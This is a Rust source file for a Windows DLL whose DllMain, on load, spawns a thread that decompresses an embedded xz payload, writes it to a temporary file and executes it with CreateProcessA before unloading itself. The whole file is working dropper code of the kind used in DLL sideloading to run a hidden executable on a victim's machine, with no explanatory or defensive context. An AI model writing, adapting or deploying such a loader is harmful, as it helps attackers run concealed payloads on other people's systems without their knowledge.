use std::{io::Read, mem, ptr};
use winapi::{
    shared::minwindef::{DWORD, FALSE, HINSTANCE, LPVOID, MAX_PATH, TRUE},
    um::{
        fileapi::{CreateFileA, GetTempFileNameA, GetTempPathA, WriteFile, CREATE_ALWAYS},
        handleapi::CloseHandle,
        libloaderapi::{DisableThreadLibraryCalls, FreeLibraryAndExitThread},
        processthreadsapi::{CreateProcessA, CreateThread, PROCESS_INFORMATION, STARTUPINFOA},
        winnt::{DLL_PROCESS_ATTACH, FILE_ATTRIBUTE_NORMAL, GENERIC_WRITE},
    },
};
use xz2::bufread::XzDecoder;

unsafe fn run_payload(payload: Vec<u8>) {
    let mut temp_path = [0u8; MAX_PATH];
    GetTempPathA(temp_path.len() as _, temp_path.as_mut_ptr() as *mut _);

    let mut temp_file_name = [0u8; MAX_PATH];
    GetTempFileNameA(
        temp_path.as_mut_ptr() as *mut _,
        ptr::null_mut(),
        0,
        temp_file_name.as_mut_ptr() as *mut _,
    );

    let file_handle = CreateFileA(
        temp_file_name.as_ptr() as *mut _,
        GENERIC_WRITE,
        0,
        ptr::null_mut(),
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        ptr::null_mut(),
    );

    WriteFile(
        file_handle,
        payload.as_ptr() as *const _,
        payload.len() as _,
        ptr::null_mut(),
        ptr::null_mut(),
    );

    CloseHandle(file_handle);

    let mut startup_info = mem::zeroed::<STARTUPINFOA>();
    let mut process_info = mem::zeroed::<PROCESS_INFORMATION>();

    CreateProcessA(
        temp_file_name.as_ptr() as *const _,
        ptr::null_mut(),
        ptr::null_mut(),
        ptr::null_mut(),
        TRUE,
        0,
        ptr::null_mut(),
        ptr::null_mut(),
        &mut startup_info,
        &mut process_info,
    );

    CloseHandle(process_info.hProcess);
    CloseHandle(process_info.hThread);
}

unsafe extern "system" fn main_thread(module: LPVOID) -> u32 {
    let compressed_payload = include_bytes!("../../compressed_payload.bin");

    let mut payload = Vec::new();
    let mut decompressor = XzDecoder::new(&compressed_payload[..]);
    decompressor.read_to_end(&mut payload).unwrap();

    run_payload(payload);

    FreeLibraryAndExitThread(module as *mut _, 0);

    unreachable!();
}

#[no_mangle]
pub extern "stdcall" fn DllMain(
    module: HINSTANCE,
    reason_for_call: DWORD,
    _reserved: LPVOID,
) -> i32 {
    match reason_for_call {
        DLL_PROCESS_ATTACH => {
            unsafe {
                DisableThreadLibraryCalls(module);
                CreateThread(
                    std::ptr::null_mut(),
                    0,
                    Some(main_thread),
                    module as _,
                    0,
                    std::ptr::null_mut(),
                );
            }

            return TRUE;
        }
        _ => return FALSE,
    }
}
